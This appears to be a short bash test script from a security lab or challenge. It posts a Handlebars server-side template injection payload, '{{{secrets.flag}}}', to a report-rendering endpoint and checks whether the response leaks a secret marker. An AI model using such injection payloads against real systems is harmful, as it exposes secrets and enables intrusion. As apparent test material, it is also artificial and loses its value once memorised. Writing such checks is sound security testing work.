#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
body=$(curl -s -X POST "$TARGET/api/reports/render" -H 'content-type: application/json' -d '{"template":"{{{secrets.flag}}}","message":"hello"}')
grep -q 'HBS-SSTI-SECRET' <<<"$body"
